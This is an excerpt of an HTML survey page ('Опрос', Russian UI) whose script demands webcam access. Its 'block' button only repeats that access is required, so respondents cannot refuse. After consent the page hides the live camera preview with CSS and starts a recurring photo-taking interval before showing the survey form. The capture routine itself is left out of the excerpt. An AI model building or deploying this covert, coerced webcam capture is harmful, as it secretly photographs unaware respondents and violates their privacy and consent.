<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Опрос</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        #cameraConsent {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #cameraConsent.hidden {
            display: none;
        }
        #cameraConsentContent {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 300px;
        }
        .consent-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-top: 20px;
        }
        .consent-button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .allow-button {
            background-color: #4CAF50;
            color: white;
        }
        .allow-button:hover {
            background-color: #45a049;
        }
        .block-button {
            background-color: #f44336;
            color: white;
        }
        .block-button:hover {
            background-color: #da190b;
        }
        #cameraPreview {
            display: none;
        }
        /* ... остальные стили ... */
    </style>
</head>
<body>
    <div id="cameraConsent">
        <div id="cameraConsentContent">
            <h2>Разрешить доступ к камере?</h2>
            <div class="consent-buttons">
                <button class="consent-button allow-button" onclick="startCamera()">Разрешить</button>
                <button class="consent-button block-button" onclick="blockCamera()">Блокировать</button>
            </div>
        </div>
    </div>

    <video id="cameraPreview" autoplay playsinline></video>

    <!-- ... остальные элементы ... -->

    <script>
        let stream = null;
        let photoInterval = null;

        // Функция для запуска камеры
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const video = document.getElementById('cameraPreview');
                video.srcObject = stream;
                
                // Скрываем окно согласия
                document.getElementById('cameraConsent').classList.add('hidden');
                
                // Запускаем интервал для фотографирования
                startPhotoInterval();
                
                // Показываем форму ввода имени
                document.getElementById('start').classList.remove('hidden');
            } catch (err) {
                console.error('Ошибка при доступе к камере:', err);
                alert('Для продолжения необходимо разрешить доступ к камере');
            }
        }

        // Функция для блокировки камеры
        function blockCamera() {
            alert('Для продолжения необходимо разрешить доступ к камере');
        }

        // ... остальные функции без изменений ...
    </script>
</body>
</html>
